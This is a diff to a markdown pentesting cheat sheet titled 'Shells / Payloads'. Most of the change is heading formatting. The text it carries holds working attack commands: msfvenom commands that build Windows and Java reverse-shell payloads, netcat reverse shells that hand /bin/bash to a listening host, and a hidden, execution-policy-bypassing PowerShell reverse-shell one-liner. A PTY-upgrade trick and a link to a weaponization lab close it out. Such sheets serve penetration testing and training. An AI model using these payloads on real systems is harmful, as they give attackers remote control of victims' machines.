@@ -1,4 +1,4 @@
-# Shells
+# Shells / Payloads
 
 **Python Bind Shell**
 
@@ -20,25 +20,25 @@ export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pt
 
 ## **Msfvenom Reverse Shells**
 
-**Staged Payloads for Windows - x86**
+#### **Staged Payloads for Windows - x86**
 
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
 ```
 
-**Staged Payloads for Windows - x64**
+#### **Staged Payloads for Windows - x64**
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
 ```
 
-**Stageless Payloads for Windows - x86**&#x20;
+#### **Stageless Payloads for Windows - x86**&#x20;
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
 ```
 
-**Stageless Payloads for Windows - x64**&#x20;
+#### **Stageless Payloads for Windows - x64**&#x20;
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
@@ -72,7 +72,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
 ```
 
-**Netcat Reverse Shells**
+#### **Netcat Reverse Shells**
 
 ```
 sudo nc -nv 10.10.10.10 443 -e /bin/bash
@@ -82,13 +82,13 @@ sudo nc -nv 10.10.10.10 443 -e /bin/bash
 nc -nv 10.10.10.10 443 -e "/bin/bash"
 ```
 
-**PowerShell Reverse Shell**
+#### **PowerShell Reverse Shell**
 
 ```
 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
-**JavaScript Reverse Shell**
+#### **JavaScript Reverse Shell**
 
 ```
 (function(){
@@ -105,10 +105,15 @@ nc -nv 10.10.10.10 443 -e "/bin/bash"
 })();
 ```
 
-**Upgrade to a PTY Shell**
+#### **Upgrade to a PTY Shell**
 
 ```
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
 python /tmp/shell.py
 export TERM=xterm # be able to clear the screen, etc.
 ```
+
+#### HTA
+
+[https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)
+
